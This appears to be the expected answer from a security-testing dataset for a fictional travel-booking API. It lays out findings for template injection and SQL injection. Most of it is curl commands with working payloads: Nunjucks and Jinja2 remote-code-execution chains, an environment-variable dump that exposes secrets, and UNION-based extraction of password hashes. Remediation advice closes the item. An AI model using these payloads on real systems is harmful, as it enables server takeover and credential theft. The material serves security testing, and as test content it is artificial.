# Expected Response

## System
- System: SkyPort Global Distribution v1.4.0
- Domain: TRAVEL / GDS
- Example ID: INJ-0118
- Risk ID: RISK-INJ-118

## Findings

### 1. SSTI (Server-Side Template Injection) on `/api/v2/accounts?filter=` — Primary (Declared Vulnerability)

The `filter` parameter on `GET /api/v2/accounts` flows into a Nunjucks/Jinja2 template context via `renderString`. Template syntax (`{{...}}`) is not escaped before rendering. An attacker can inject template expressions to execute server-side code.

The HAR shows `filter={{7*7}}` triggering a response that returns SQL account records. Note: HAR response shows database records rather than template output `49` — indicating the template injection also triggers SQL query execution via the raw concatenation in the same endpoint. Both injection surfaces are present simultaneously due to the legacy endpoint's dual code path.

**Evidence from HAR:**
- Endpoint: `GET /api/v2/accounts?filter={{7*7}}` (SSTI probe payload)
- Response: HTTP 200 with all account records including `password_hash`, `role: "ADMIN"`
- `filter` flows into both SQL string concatenation and Nunjucks `renderString`

**Step 1 — Template evaluation probe (SSTI detection):**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{7*7}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable SSTI indicator:** Response body contains `49` or template expression evaluated in output, or all account records returned.

**Step 2 — Nunjucks environment variable / config leak:**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{global.process.env|dump}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Server environment variables (JWT secrets, DB credentials, API keys) appear in response — full credential exposure.

**Step 3 — Nunjucks RCE via constructor chain:**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{range.constructor(%22return+global.process.mainModule.require(%27child_process%27).execSync(%27id%27).toString()%22)()}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** `uid=0(root)` or service account identity returned — Remote Code Execution on the GDS backend server.

**Step 4 — Jinja2 RCE (Python legacy service path):**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

### 2. SQL Injection on `/api/v2/accounts?filter=` — Secondary (Code Snippet Evidence, RISK-INJ-118)

Code snippet shows raw SQL concatenation of `filter` parameter with `db_owner` database privileges.

**Step 5 — SQL tautology to dump all accounts (as evidenced in HAR response):**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter=' OR 1=1 --" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All account records returned including admin credentials.

**Step 6 — UNION SELECT credential extraction (db_owner privileges):**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter=' UNION SELECT username,password_hash,role,NULL FROM accounts --" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All passenger/agent credentials for the GDS platform exposed.

**Step 7 — Verbose error SQL fingerprint:**
```bash
curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error (RISK-INJ-118 misconfiguration):** SQL syntax error leaking table/column names.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- Escape all user input before passing to Nunjucks/Jinja2 `renderString`; never pass raw request parameters into template context (RISK-INJ-118).
- Replace raw SQL concatenation with parameterized queries.
- Restrict DB account to SELECT/INSERT/UPDATE/DELETE on required tables (remove `db_owner`).
- Disable verbose error messages in production.
- Deploy input validation middleware rejecting template metacharacters (`{{`, `}}`, `{%`, `%}`).
